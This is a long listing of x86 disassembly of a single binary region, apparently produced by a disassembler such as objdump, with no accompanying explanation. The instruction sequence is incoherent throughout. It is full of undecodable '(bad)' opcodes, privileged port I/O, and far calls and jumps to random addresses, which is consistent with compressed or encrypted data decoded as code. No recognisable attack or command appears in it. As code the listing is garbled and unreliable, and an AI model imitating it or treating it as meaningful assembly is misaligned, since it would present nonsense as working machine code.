  41c277:	stos   BYTE PTR es:[edi],al
  41c278:	add    eax,0xe37ca472
  41c27d:	xchg   esi,eax
  41c27e:	clc    
  41c27f:	xchg   esi,eax
  41c280:	(bad)  
  41c281:	aad    0xad
  41c283:	sbb    DWORD PTR [esi+0x48],edi
  41c286:	outs   dx,DWORD PTR ds:[esi]
  41c287:	cmc    
  41c288:	mov    dh,0x5
  41c28a:	mov    ebp,ss
  41c28c:	ficom  DWORD PTR [ecx+0x822dc]
  41c292:	out    0x2a,al
  41c294:	(bad)  
  41c296:	inc    ch
  41c298:	pop    edi
  41c299:	xor    DWORD PTR [ecx-0x4a3b13d1],ebp
  41c29f:	cmpps  xmm7,xmm5,0x90
  41c2a3:	xor    dl,BYTE PTR [edx]
  41c2a5:	push   0xfffffff3
  41c2a7:	fstp   DWORD PTR [ebx-0x4c1229c4]
  41c2ad:	in     eax,0xec
  41c2af:	pop    esp
  41c2b0:	loope  0x41c2d4
  41c2b2:	push   cx
  41c2b4:	addr16 leave 
  41c2b6:	inc    esi
  41c2b7:	xchg   ecx,eax
  41c2b8:	mov    ah,0x8e
  41c2ba:	mov    bl,0x80
  41c2bc:	call   0x1816:0x7df84649
  41c2c3:	sar    BYTE PTR [edx-0x72d9d4c6],0x4f
  41c2ca:	aaa    
  41c2cb:	ds out dx,al
  41c2cd:	fist   DWORD PTR ds:0xc68ce12c
  41c2d3:	jmp    0x41c25c
  41c2d5:	mov    eax,ds:0x85eaee01
  41c2da:	xor    al,bl
  41c2dc:	dec    edi
  41c2dd:	ins    DWORD PTR es:[edi],dx
  41c2de:	dec    ebp
  41c2df:	add    edx,DWORD PTR [edx-0x79144ac2]
  41c2e5:	fs je  0x41c2f9
  41c2e8:	stos   BYTE PTR es:[edi],al
  41c2e9:	mov    al,ds:0xec1a4932
  41c2ee:	gs mov ch,0xff
  41c2f1:	stc    
  41c2f2:	jb     0x41c30f
  41c2f4:	mov    BYTE PTR [ebp+0x5a],ch
  41c2f7:	cmp    edi,eax
  41c2f9:	int    0xc7
  41c2fb:	and    ah,BYTE PTR [edi+edx*8-0x60]
  41c2ff:	or     al,0xf
  41c301:	fisttp DWORD PTR [edx+0x5da022b0]
  41c307:	jo     0x41c28d
  41c309:	jne    0x41c35c
  41c30b:	or     BYTE PTR [ebx+ebp*1],bl
  41c30e:	adc    ah,dh
  41c310:	into   
  41c311:	xor    DWORD PTR ds:0x19a3063,0xaae7100d
  41c31b:	aad    0xc
  41c31d:	scas   al,BYTE PTR es:[edi]
  41c31e:	ret    0x5e0
  41c321:	and    al,0xea
  41c323:	jbe    0x41c336
  41c325:	sbb    al,0x32
  41c327:	das    
  41c328:	out    0x5c,eax
  41c32a:	imul   esi,DWORD PTR [ecx+0x49a22a08],0x75
  41c331:	fadd   QWORD PTR [ecx]
  41c333:	lahf   
  41c334:	imul   eax,DWORD PTR [ebp+0x3629ba5],0xffffffd8
  41c33b:	and    al,0x2
  41c33d:	inc    esp
  41c33e:	nop
  41c33f:	das    
  41c340:	mov    edi,0x606dd799
  41c345:	mov    ds:0xd91cc545,eax
  41c34a:	loope  0x41c38c
  41c34c:	clc    
  41c34d:	test   ebx,0xaa2725ca
  41c353:	jg     0x41c36f
  41c355:	loope  0x41c350
  41c357:	jno    0x41c2e7
  41c359:	in     eax,dx
  41c35a:	xor    edx,DWORD PTR [edx]
  41c35c:	and    al,ah
  41c35e:	rcl    DWORD PTR [edi+0x6d537357],1
  41c364:	js     0x41c328
  41c366:	fld    QWORD PTR [edx+edx*4+0x189ceff0]
  41c36d:	int3   
  41c36e:	lods   al,BYTE PTR ds:[esi]
  41c36f:	jmp    0xb4a186d1
  41c374:	xor    esi,esi
  41c376:	ror    BYTE PTR [edx],cl
  41c378:	sbb    eax,0x272c1a43
  41c37d:	mov    ch,0x6c
  41c37f:	dec    ebp
  41c380:	mov    ch,0xd9
  41c382:	push   ss
  41c383:	pop    es
  41c384:	shl    al,cl
  41c386:	bound  ebp,QWORD PTR [esi+eax*8-0x2c]
  41c38a:	je     0x41c334
  41c38c:	cs jb  0x41c3e8
  41c38f:	mov    ds:0xc9b05589,al
  41c394:	stos   BYTE PTR es:[edi],al
  41c395:	dec    ebx
  41c396:	ins    DWORD PTR es:[edi],dx
  41c397:	add    BYTE PTR [esi],cl
  41c399:	cld    
  41c39a:	cld    
  41c39b:	adc    dh,ah
  41c39d:	imul   ebx,DWORD PTR [edx+0x5f],0x87421c79
  41c3a4:	retf   0xc604
  41c3a7:	or     eax,0xfdc76762
  41c3ac:	fsub   QWORD PTR [edx-0x53324648]
  41c3b2:	gs pop esi
  41c3b4:	repnz into 
  41c3b6:	sub    dh,bh
  41c3b8:	sti    
  41c3b9:	(bad)  
  41c3ba:	(bad)  
  41c3bc:	and    edx,0xffffffcd
  41c3bf:	cmp    al,0xd1
  41c3c1:	mov    ebx,0xbdfd2b53
  41c3c6:	stc    
  41c3c7:	aad    0x5
  41c3c9:	dec    eax
  41c3ca:	sub    BYTE PTR [eax],al
  41c3cc:	loope  0x41c439
  41c3ce:	xchg   BYTE PTR [edi],dl
  41c3d0:	jne    0x41c36b
  41c3d2:	pop    ds
  41c3d3:	mov    ebx,0x769b1819
  41c3d8:	test   BYTE PTR [edx],dh
  41c3da:	or     DWORD PTR [eax-0x1ec5d0e0],0x66
  41c3e1:	mov    WORD PTR cs:[ecx],cs
  41c3e4:	test   eax,0x4913cdf
  41c3e9:	repz ret 
  41c3eb:	mov    bl,BYTE PTR [edx+ecx*4+0x1]
  41c3ef:	mov    cl,0x33
  41c3f1:	not    DWORD PTR [esi-0x11]
  41c3f4:	mov    ah,0xfe
  41c3f6:	cwde   
  41c3f7:	imul   esi,DWORD PTR [esi],0x69
  41c3fa:	sub    eax,0x55817702
  41c3ff:	adc    eax,0x1d458ecd
  41c404:	push   ecx
  41c405:	cmc    
  41c406:	xchg   esi,eax
  41c407:	mov    ah,0x86
  41c409:	js     0x41c3f0
  41c40b:	arpl   si,cx
  41c40d:	shl    BYTE PTR ds:0x850f173a,1
  41c413:	call   0x83fc088
  41c418:	mov    cl,0xe9
  41c41a:	jbe    0x41c3a2
  41c41c:	mov    bl,0x37
  41c41e:	add    eax,0x6d62a57f
  41c423:	hlt    
  41c424:	cli    
  41c425:	xor    bh,BYTE PTR [edx+0x324851c4]
  41c42b:	jbe    0x41c411
  41c42d:	mov    eax,ds:0xc1e4fb55
  41c432:	fnsave [ecx]
  41c434:	xchg   edx,eax
  41c435:	mov    al,ds:0x97f44999
  41c43a:	or     BYTE PTR [edi-0x3ec51b75],al
  41c440:	push   ebp
  41c441:	loope  0x41c427
  41c443:	pushf  
  41c444:	cmp    eax,0xffffffef
  41c447:	lods   eax,DWORD PTR ds:[esi]
  41c448:	jb     0x41c46c
  41c44a:	push   eax
  41c44b:	je     0x41c42c
  41c44d:	daa    
  41c44e:	and    BYTE PTR [ebx+0x14b88c68],dh
  41c454:	jmp    0x41c43e
  41c456:	test   DWORD PTR ds:0xc72b4179,edx
  41c45c:	xor    ah,ah
  41c45e:	pop    eax
  41c45f:	cmp    BYTE PTR [edx+0xd],cl
  41c462:	or     edx,DWORD PTR [ecx+edi*4+0x69a4e816]
  41c469:	ret    
  41c46a:	mov    edi,0x86524d4b
  41c46f:	xchg   edx,eax
  41c470:	xchg   DWORD PTR [ecx+0x8f168d4],eax
  41c476:	enter  0xcd45,0x86
  41c47a:	adc    al,0x7c
  41c47c:	jle    0x41c48b
  41c47e:	ret    0x3a66
  41c481:	jmp    0x41c4f2
  41c483:	mov    ebp,0xf3053a35
  41c488:	mov    cl,0x49
  41c48a:	add    edx,esi
  41c48c:	or     BYTE PTR [eax+0x7b],ah
  41c48f:	inc    ebx
  41c490:	inc    esi
  41c491:	mov    WORD PTR [ebp-0x7098436a],ds
  41c497:	sub    ah,BYTE PTR [esi]
  41c499:	gs xchg edi,eax
  41c49b:	inc    ebx
  41c49c:	xor    BYTE PTR [ecx+ebp*4],0x1f
  41c4a0:	fdiv   st,st(5)
  41c4a2:	out    0x1b,eax
  41c4a4:	cdq    
  41c4a5:	in     al,dx
  41c4a6:	xchg   edi,eax
  41c4a7:	sub    DWORD PTR [edi+0x555edad8],edi
  41c4ad:	push   ss
  41c4ae:	mov    eax,ds:0xcda68695
  41c4b3:	(bad)  
  41c4b4:	cld    
  41c4b5:	jmp    0x41c4e7
  41c4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b8:	sahf   
  41c4b9:	xchg   edi,eax
  41c4ba:	ret    0x5bd3
  41c4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4be:	mov    ecx,0x8c4405b
  41c4c3:	sub    al,0xab
  41c4c5:	sbb    al,BYTE PTR [edi+0x2b]
  41c4c8:	xchg   ecx,eax
  41c4c9:	push   ecx
  41c4ca:	adc    DWORD PTR [ecx+0x5d3262ed],0xb4400577
  41c4d4:	fwait
  41c4d5:	pop    esi
  41c4d6:	mov    esp,0xe4251f11
  41c4db:	lahf   
  41c4dc:	in     al,0x72
  41c4de:	and    al,0x54
  41c4e0:	fmulp  st(0),st
  41c4e2:	inc    ebp
  41c4e3:	push   0x8c835acb
  41c4e8:	dec    ecx
  41c4e9:	loop   0x41c524
  41c4eb:	pop    eax
  41c4ec:	mov    ebx,0x749bc6b1
  41c4f1:	cwde   
  41c4f2:	push   edx
  41c4f3:	jmp    0x41c4e5
  41c4f5:	xor    eax,0x8efa7bb4
  41c4fa:	sbb    al,0x74
  41c4fc:	ds jp  0x41c4c5
  41c4ff:	pop    edx
  41c500:	lea    edx,[esi-0x7d]
  41c503:	mov    DWORD PTR [edx+0x52],ebp
  41c506:	pop    eax
  41c507:	or     cl,dl
  41c509:	mov    ah,0x12
  41c50b:	ret    
  41c50c:	push   eax
  41c50d:	xchg   esp,eax
  41c50e:	(bad)  
  41c50f:	push   sp
  41c511:	mov    esi,0xcfae423e
  41c516:	popf   
  41c517:	mov    ds:0x18264b56,eax
  41c51c:	ficomp DWORD PTR [eax]
  41c51e:	mov    eax,ds:0x760cd1c3
  41c523:	das    
  41c524:	data16 sbb ch,0x24
  41c528:	dec    ebx
  41c529:	xor    ebp,DWORD PTR [esi-0x70]
  41c52c:	sbb    al,0x9
  41c52e:	in     eax,0xb6
  41c530:	pop    esp
  41c531:	xchg   ecx,eax
  41c532:	sbb    ah,BYTE PTR [eax]
  41c534:	fs jnp 0x41c5a5
  41c537:	jbe    0x41c51c
  41c539:	jno    0x41c5ad
  41c53b:	dec    esp
  41c53c:	mov    bh,0xb7
  41c53e:	pop    ss
  41c53f:	rcr    ebx,1
  41c541:	xchg   BYTE PTR [edi],dl
  41c543:	sub    DWORD PTR [ebx+0x5f],esp
  41c546:	mov    bh,ch
  41c548:	cs call 0xa4bf7a32
  41c54e:	(bad)  
  41c54f:	jbe    0x41c58e
  41c551:	mov    dl,BYTE PTR [ecx-0x17]
  41c554:	xlat   BYTE PTR ds:[ebx]
  41c555:	test   dh,ch
  41c557:	pop    esi
  41c558:	mov    dh,0x48
  41c55a:	aad    0xdb
  41c55c:	rcl    BYTE PTR [edi-0x1c7f3498],0xaa
  41c563:	cmp    eax,DWORD PTR [eax+0x28]
  41c566:	dec    ebx
  41c567:	sbb    edx,DWORD PTR [ecx+0x1e]
  41c56a:	cli    
  41c56b:	shr    DWORD PTR [esi],cl
  41c56d:	jmp    0x41c58a
  41c56f:	cmc    
  41c570:	pop    esp
  41c571:	cmp    al,0x13
  41c573:	sub    DWORD PTR [ebp+0x68],esi
  41c576:	aam    0x72
  41c578:	retf   0x4369
  41c57b:	shr    DWORD PTR [edi],0x65
  41c57e:	stos   BYTE PTR es:[edi],al
  41c57f:	cdq    
  41c580:	cmc    
  41c581:	fwait
  41c582:	push   es
  41c583:	aam    0x23
  41c585:	jbe    0x41c5f1
  41c587:	cmp    cl,BYTE PTR [edi+0x526e62ed]
  41c58d:	adc    bl,BYTE PTR [ebp-0x5c]
  41c590:	hlt    
  41c591:	add    ebx,edi
  41c593:	mov    ds:0x4f7ee02,eax
  41c598:	div    DWORD PTR [edi+0x22c1763f]
  41c59e:	ins    BYTE PTR es:[edi],dx
  41c59f:	or     eax,0x2e155272
  41c5a4:	fnsave [edi+0x2fc9ad5f]
  41c5aa:	leave  
  41c5ab:	sub    eax,0x305a3283
  41c5b0:	xchg   ebp,eax
  41c5b1:	xlat   BYTE PTR ds:[ebx]
  41c5b2:	sbb    BYTE PTR [ebx],cl
  41c5b4:	out    dx,eax
  41c5b5:	add    DWORD PTR [ebx-0x56],0x9
  41c5b9:	adc    dl,BYTE PTR [edi+0x18b7a95]
  41c5bf:	inc    esi
  41c5c0:	aaa    
  41c5c1:	test   BYTE PTR [ecx],ch
  41c5c3:	out    dx,al
  41c5c4:	cmp    ecx,ebp
  41c5c6:	cdq    
  41c5c7:	dec    edi
  41c5c8:	popa   
  41c5c9:	mov    edx,0xcca7165f
  41c5ce:	loope  0x41c616
  41c5d0:	imul   esi,edi,0xd3af7cff
  41c5d6:	mov    al,ds:0xb91e0bbf
  41c5db:	call   0x810022a2
  41c5e0:	or     BYTE PTR [eax+0x66],dh
  41c5e3:	cmc    
  41c5e4:	not    DWORD PTR [ebx]
  41c5e6:	repz inc ebx
  41c5e8:	push   ebp
  41c5e9:	xchg   ebx,eax
  41c5ea:	ss cs push esp
  41c5ed:	jbe    0x41c5ad
  41c5ef:	pusha  
  41c5f0:	cwde   
  41c5f1:	pop    ss
  41c5f2:	mov    ebp,0x58b7b0bf
  41c5f7:	jp     0x41c610
  41c5f9:	jbe    0x41c5f7
  41c5fb:	sti    
  41c5fc:	sbb    eax,0xda04d7e6
  41c601:	arpl   ax,sp
  41c603:	xlat   BYTE PTR ds:[ebx]
  41c604:	add    DWORD PTR [eax+eiz*2-0x79],esp
  41c608:	pop    ebp
  41c609:	push   ebx
  41c60a:	gs int3 
  41c60c:	xchg   ecx,eax
  41c60d:	les    ebp,FWORD PTR [edx]
  41c60f:	cmp    eax,0x5b532c37
  41c614:	push   0x8c85324
  41c619:	dec    ebx
  41c61a:	pop    es
  41c61b:	pop    edx
  41c61c:	mov    ds:0x2a2d4a81,al
  41c621:	xchg   esi,eax
  41c622:	xor    ebx,0x7e
  41c625:	xor    ax,WORD PTR [esi+0x109ed9f]
  41c62c:	and    al,0x29
  41c62e:	adc    DWORD PTR [eax+0xdb53059],esp
  41c634:	iret   
  41c635:	xor    ch,ah
  41c637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c638:	add    DWORD PTR [ebp+0x6c12cb0f],edx
  41c63e:	inc    ecx
  41c63f:	pop    edx
  41c640:	cli    
  41c641:	sub    bh,BYTE PTR [ebx-0x68]
  41c644:	xor    eax,esi
  41c646:	xor    ebp,DWORD PTR [esi]
  41c648:	icebp  
  41c649:	xchg   esi,edi
  41c64b:	dec    edx
  41c64c:	jmp    0x381adfff
  41c651:	pop    esi
  41c652:	or     bh,BYTE PTR [ebx]
  41c654:	fistp  DWORD PTR [edx+ebx*8+0x16e9ae4c]
  41c65b:	mov    dh,0x23
  41c65d:	mov    esi,0x24d39872
  41c662:	sbb    bh,BYTE PTR [edx]
  41c664:	push   eax
  41c665:	xchg   esi,eax
  41c666:	pop    edi
  41c667:	jge    0x41c67a
  41c669:	sub    al,0x15
  41c66b:	jle    0x41c5f0
  41c66d:	rol    BYTE PTR [eax+0xf1c06d0],1
  41c673:	in     eax,0x90
  41c675:	pop    edi
  41c676:	out    dx,al
  41c677:	mov    cl,0xfa
  41c679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c67a:	pop    eax
  41c67b:	cmp    eax,0xeea3fc04
  41c680:	cld    
  41c681:	push   esp
  41c682:	mov    al,ds:0x84e38c19
  41c687:	xor    eax,ecx
  41c689:	xchg   edx,eax
  41c68a:	dec    eax
  41c68b:	shr    cl,0x9b
  41c68e:	les    ecx,FWORD PTR [ebp+0x39954e7b]
  41c694:	mov    ds:0x3469ed1d,al
  41c699:	stos   DWORD PTR es:[edi],eax
  41c69a:	(bad)  
  41c69b:	das    
  41c69c:	scas   eax,DWORD PTR es:[edi]
  41c69d:	mov    al,0x64
  41c6a0:	popa   
  41c6a1:	ins    BYTE PTR es:[edi],dx
  41c6a2:	test   DWORD PTR [esi-0x1b746fc1],edi
  41c6a8:	or     eax,0x6326fd13
  41c6ad:	out    dx,eax
  41c6ae:	loop   0x41c682
  41c6b0:	in     eax,dx
  41c6b1:	outs   dx,DWORD PTR ds:[esi]
  41c6b2:	or     DWORD PTR [ecx],eax
  41c6b4:	mov    ah,0xaf
  41c6b6:	jmp    0x41c6a5
  41c6b8:	cwde   
  41c6b9:	fcmovnu st,st(7)
  41c6bb:	cmp    DWORD PTR [edi+0x4c8f431e],ebx
  41c6c1:	sbb    DWORD PTR [ebp-0x20],ecx
  41c6c4:	adc    dh,ch
  41c6c6:	add    al,0xb3
  41c6c8:	rcl    cl,cl
  41c6ca:	xchg   ebp,eax
  41c6cb:	test   al,0x2f
  41c6cd:	pop    ebp
  41c6ce:	call   0x6b73:0x42c58b01
  41c6d5:	int    0x5d
  41c6d7:	add    bh,BYTE PTR [eax]
  41c6d9:	cwde   
  41c6da:	idiv   BYTE PTR [ebx]
  41c6dc:	push   ebp
  41c6dd:	in     eax,0x5a
  41c6df:	inc    esp
  41c6e0:	es jo  0x41c6e3
  41c6e3:	data16 xor BYTE PTR [eax+0x7fc5cff6],0x8e
  41c6eb:	imul   ebx,DWORD PTR [eax],0x8041adc9
  41c6f1:	or     eax,0xd86a60e0
  41c6f6:	cwde   
  41c6f7:	test   eax,0x2b43692e
  41c6fc:	cld    
  41c6fd:	push   ss
  41c6fe:	adc    BYTE PTR [edx-0x4e05f91c],cl
  41c704:	cmc    
  41c705:	jle    0x41c76f
  41c707:	pushf  
  41c708:	jb     0x41c747
  41c70a:	sbb    al,0x19
  41c70c:	je     0x41c70e
  41c70e:	ret    
  41c70f:	mov    bl,0x5c
  41c711:	(bad)  
  41c712:	or     al,0xd6
  41c714:	push   ss
  41c715:	cdq    
  41c716:	bnd jp 0x41c6b7
  41c719:	pop    ecx
  41c71a:	imul   ecx,DWORD PTR [esi-0x42ad6b22],0xbca4a954
  41c724:	cmp    ebp,edi
  41c726:	mov    ah,0xb6
  41c728:	or     dh,ch
  41c72a:	mov    bh,0xef
  41c72c:	adc    al,0xc
  41c72e:	and    al,0x40
  41c730:	jb     0x41c783
  41c732:	loop   0x41c7a6
  41c734:	sub    BYTE PTR [edi-0x3b34a5f7],cl
  41c73a:	sbb    al,0xad
  41c73c:	jmp    0xd14d:0x59cd5597
  41c743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c744:	dec    ebx
  41c745:	and    ecx,ebp
  41c747:	jle    0x41c7ba
  41c749:	lods   al,BYTE PTR ds:[esi]
  41c74a:	stc    
  41c74b:	sbb    eax,0x1703eab0
  41c750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c751:	add    ch,al
  41c753:	rcr    dl,0x72
  41c756:	scas   eax,DWORD PTR es:[edi]
  41c757:	aad    0xd1
  41c759:	pop    edx
  41c75a:	or     eax,0x79395b13
  41c75f:	push   ds
  41c760:	mov    edi,0xcab1c6c5
  41c765:	ins    DWORD PTR es:[edi],dx
  41c766:	call   0x5fc2b928
  41c76b:	sbb    al,0xc7
  41c76d:	retf   0xc944
  41c770:	mov    eax,ds:0xa7c66405
  41c775:	inc    ebp
  41c776:	pop    ebx
  41c777:	stos   DWORD PTR es:[edi],eax
  41c778:	ret    
  41c779:	test   DWORD PTR [ebx],0x8008fad5
  41c77f:	out    0x2a,al
  41c781:	push   ecx
  41c782:	lods   al,BYTE PTR ds:[esi]
  41c783:	jnp    0x41c706
  41c785:	test   DWORD PTR [eax],edx
  41c787:	mov    ds:0xdc65c633,al
  41c78c:	dec    ebx
  41c78d:	test   eax,0xa68b9088
  41c792:	call   0x1c55:0x44910ba3
  41c799:	jmp    0x9c05ac4c
  41c79e:	push   cs
  41c79f:	push   esp
  41c7a0:	repnz xchg ebx,eax
  41c7a2:	xchg   ebx,eax
  41c7a3:	push   0x60fff40c
  41c7a8:	mov    bh,0x1
  41c7aa:	cmp    eax,0xafc01c94
  41c7af:	push   ecx
  41c7b0:	inc    edx
  41c7b1:	mov    ch,0x29
  41c7b3:	mov    cl,0xec
  41c7b5:	test   BYTE PTR [esi+0x5cd306a0],dh
  41c7bb:	add    eax,0xf5c22985
  41c7c0:	push   esi
  41c7c1:	clc    
  41c7c2:	pop    es
  41c7c3:	je     0x41c792
  41c7c5:	js     0x41c81b
  41c7c7:	or     al,0x3c
  41c7c9:	xor    DWORD PTR [esi],eax
  41c7cb:	popf   
  41c7cc:	test   al,0x68
  41c7ce:	push   0xeb59cfd8
  41c7d3:	sbb    al,0xbb
  41c7d5:	repnz pop ss
  41c7d7:	add    eax,DWORD PTR [ecx-0x3be31a6e]
  41c7dd:	xchg   esp,eax
  41c7de:	pop    ss
  41c7df:	sub    bh,BYTE PTR [ecx]
  41c7e1:	jo     0x41c80b
  41c7e3:	or     BYTE PTR [eax],ah
  41c7e5:	or     DWORD PTR [ebx+0x2b01628f],edi
  41c7eb:	rcr    DWORD PTR [esi],cl
  41c7ed:	in     al,dx
  41c7ee:	mov    WORD PTR [ecx-0x40a6eae5],?
  41c7f4:	stos   DWORD PTR es:[edi],eax
  41c7f5:	cmp    eax,0x77acec2e
  41c7fa:	mov    ch,0x9c
  41c7fc:	pop    ebx
  41c7fd:	mov    esp,0x3d8d0ac2
  41c802:	stos   BYTE PTR es:[edi],al
  41c803:	jne    0x41c7bd
  41c805:	mov    ch,dh
  41c807:	xchg   ecx,eax
  41c808:	mov    al,0x1c
  41c80a:	sub    al,0x10
  41c80c:	or     BYTE PTR [ebx-0x3ec3a3da],0x53
  41c813:	(bad)  
  41c814:	dec    ebx
  41c815:	mov    ebp,DWORD PTR [ebx-0x23ff1973]
  41c81b:	or     eax,0x16442df9
  41c820:	das    
  41c821:	pop    edx
  41c822:	add    ebp,esp
  41c824:	mov    ecx,0x204102ee
  41c829:	and    BYTE PTR [eax],0x67
  41c82c:	je     0x41c879
  41c82e:	mov    cl,0x33
  41c830:	dec    eax
  41c831:	lods   al,BYTE PTR ds:[esi]
  41c832:	loopne 0x41c7ce
  41c834:	pop    DWORD PTR [ebx+ebp*4]
  41c837:	sbb    eax,DWORD PTR [eax]
  41c839:	push   esi
  41c83a:	xchg   edi,eax
  41c83b:	xor    al,BYTE PTR [esi+0x88378ab]
  41c841:	cli    
  41c842:	jb     0x41c80a
  41c844:	add    esp,DWORD PTR [ecx+0x497ecbf5]
  41c84a:	lods   eax,DWORD PTR ds:[esi]
  41c84b:	imul   BYTE PTR ds:0xd47336cf
  41c851:	and    eax,0xac3a2827
  41c856:	sahf   
  41c857:	xchg   edx,eax
  41c858:	add    DWORD PTR [esi],eax
  41c85a:	lahf   
  41c85b:	mov    bh,0xdb
  41c85d:	dec    edx
  41c85e:	xor    BYTE PTR [ebp+0x5a],ch
  41c861:	sub    BYTE PTR ds:0x86dfefe7,dl
  41c867:	xor    al,0x6
  41c869:	jg     0x41c8d0
  41c86b:	popf   
  41c86c:	adc    DWORD PTR ds:0x3749c976,ebx
  41c872:	lock inc esp
  41c874:	mov    ah,0x67
  41c876:	test   eax,0x4f74d178
  41c87b:	jbe    0x41c88d
  41c87d:	adc    eax,0x9cfb7c2b
  41c882:	xchg   esi,eax
  41c883:	pop    ds
  41c884:	xchg   esi,eax
  41c885:	iret   
  41c886:	jge    0x41c890
  41c888:	jl     0x41c887
  41c88a:	push   eax
  41c88b:	sar    BYTE PTR [ebx],0xd7
  41c88e:	add    ebx,DWORD PTR [edi-0x2b]
  41c891:	inc    ebp
  41c892:	retf   
  41c893:	and    al,BYTE PTR [ecx-0x4a8ea540]
  41c899:	jae    0x41c81e
  41c89b:	adc    ecx,DWORD PTR [ebx+0x11acfa1b]
  41c8a1:	es mov dl,0x90
  41c8a4:	dec    edx
  41c8a5:	mov    ds:0xbe4f7375,eax
  41c8aa:	dec    BYTE PTR [ebx]
  41c8ac:	dec    edx
  41c8ad:	mov    eax,0x5835ba75
  41c8b2:	iret   
  41c8b3:	or     bh,cl
  41c8b5:	leave  
  41c8b6:	mov    dh,0x32
  41c8b8:	es int 0x97
  41c8bb:	dec    edx
  41c8bc:	es adc eax,0x41cd5a9d
  41c8c2:	inc    esi
  41c8c3:	stos   DWORD PTR es:[edi],eax
  41c8c4:	push   ebp
  41c8c5:	ficomp WORD PTR [esi+0x136b503b]
  41c8cb:	in     eax,0x9b
  41c8cd:	xchg   BYTE PTR [esp],dh
  41c8d0:	out    0xa1,al
  41c8d2:	and    eax,0x39cb139c
  41c8d7:	xchg   eax,eax
  41c8d9:	sbb    BYTE PTR [ecx+0x38429f7b],dl
  41c8df:	rcl    DWORD PTR [ebx],cl
  41c8e1:	test   bh,bh
  41c8e3:	push   ds
  41c8e4:	dec    ebp
  41c8e5:	daa    
  41c8e6:	stos   DWORD PTR es:[edi],eax
  41c8e7:	dec    ebx
  41c8e8:	enter  0xe0ff,0x6c
  41c8ec:	xor    BYTE PTR [esi+esi*4],cl
  41c8ef:	rcr    BYTE PTR [edi-0x50d57a1e],0x4b
  41c8f6:	sub    al,0x15
  41c8f8:	sub    ecx,DWORD PTR [ecx]
  41c8fa:	xor    esi,eax
  41c8fc:	addr16 fs push edi
  41c8ff:	or     BYTE PTR ds:0xb3e4d414,ch
  41c905:	xchg   ebp,eax
  41c906:	or     DWORD PTR [edi],esi
  41c908:	pusha  
  41c909:	popf   
  41c90a:	add    ah,BYTE PTR [eax]
  41c90c:	out    dx,al
  41c90d:	sub    ebp,eax
  41c90f:	cmp    BYTE PTR [ecx+0x432f76fe],al
  41c915:	jecxz  0x41c95a
  41c917:	test   eax,0x462d4e13
  41c91c:	in     al,dx
  41c91d:	pop    eax
  41c91e:	mov    ch,0x35
  41c920:	or     ah,cl
  41c922:	test   BYTE PTR [edx-0x46375b16],dl
  41c928:	inc    edi
  41c929:	sub    BYTE PTR [esi+esi*8],dl
  41c92c:	pop    ss
  41c92d:	pop    ecx
  41c92e:	jne    0x41c900
  41c930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c931:	jb     0x41c97d
  41c933:	ror    BYTE PTR [ebp+eax*4+0x243113c3],0x6f
  41c93b:	cli    
  41c93c:	ror    DWORD PTR [ebx],0xd8
  41c93f:	sbb    esp,DWORD PTR [eax]
  41c941:	inc    ebp
  41c942:	popf   
  41c943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c944:	xchg   ebp,eax
  41c945:	(bad)  
  41c946:	(bad)  
  41c947:	xor    eax,0xfd7dbba9
  41c94c:	push   esi
  41c94d:	add    ch,BYTE PTR [ebx+0x5401afbe]
  41c953:	xlat   BYTE PTR ds:[ebx]
  41c954:	dec    edi
  41c955:	mov    ebx,0x35852e49
  41c95a:	mov    eax,0xafcf24d0
  41c95f:	bound  edx,QWORD PTR gs:[edi-0x50]
  41c963:	sub    ecx,DWORD PTR [ebx+0x10]
  41c966:	arpl   WORD PTR [ebx+esi*8],bp
  41c969:	fwait
  41c96a:	or     bh,bl
  41c96c:	jnp    0x41c99f
  41c96e:	out    dx,eax
  41c96f:	fs mov bh,0xed
  41c972:	shl    BYTE PTR [eax],cl
  41c974:	and    al,0xbd
  41c976:	(bad)  
  41c977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c978:	scas   al,BYTE PTR es:[edi]
  41c979:	fs daa 
  41c97b:	sahf   
  41c97c:	inc    edi
  41c97d:	or     al,0x94
  41c97f:	ret    
  41c980:	ja     0x41c97c
  41c982:	sub    eax,0x27354660
  41c987:	sbb    al,0x19
  41c989:	xchg   edi,eax
  41c98a:	mov    ah,0x82
  41c98c:	in     al,0xc4
  41c98e:	rol    DWORD PTR [esi],0xf9
  41c991:	sbb    eax,0xdacc70fb
  41c996:	ror    BYTE PTR [edx-0x2176660d],0xb9
  41c99d:	mov    eax,ds:0xa9646b6a
  41c9a2:	sti    
  41c9a3:	mov    es,WORD PTR [ecx]
  41c9a5:	xchg   ebx,eax
  41c9a6:	pop    eax
  41c9a7:	mov    dh,0xa4
  41c9a9:	mov    eax,0x73bb8ca7
  41c9ae:	mov    DWORD PTR [esi],ebx
  41c9b0:	pop    es
  41c9b1:	sahf   
  41c9b2:	pop    edi
  41c9b3:	jae    0x41c94c
  41c9b5:	outs   dx,BYTE PTR ds:[esi]
  41c9b6:	xchg   ecx,eax
  41c9b7:	dec    ebp
  41c9b8:	push   ds
  41c9b9:	lods   eax,DWORD PTR ds:[esi]
  41c9ba:	adc    eax,0x884b7692
  41c9bf:	inc    esp
  41c9c0:	adc    ah,dh
  41c9c2:	loopne 0x41c98d
  41c9c4:	fidivr DWORD PTR [edi+0x65]
  41c9c7:	or     al,0x3c
  41c9c9:	test   DWORD PTR [edi-0x5cff1b11],ebp
  41c9cf:	ins    DWORD PTR es:[edi],dx
  41c9d0:	not    edx
  41c9d2:	add    esi,DWORD PTR [esi+ecx*1]
  41c9d5:	xor    eax,0x484e4adc
  41c9da:	pop    ds
  41c9db:	mov    ebp,0x7a545978
  41c9e0:	(bad)  
  41c9e2:	xor    BYTE PTR [ebx],bl
  41c9e4:	fst    st(1)
  41c9e6:	mov    esp,DWORD PTR [ebx]
  41c9e8:	pusha  
  41c9e9:	jae    0x41c98d
  41c9eb:	jne    0x41c9c7
  41c9ed:	push   edi
  41c9ee:	push   ecx
  41c9ef:	repz xchg ebx,eax
  41c9f1:	xor    dl,dl
  41c9f3:	test   al,0xed
  41c9f5:	adc    al,0xae
  41c9f7:	push   0xe504490f
  41c9fc:	test   dl,cl
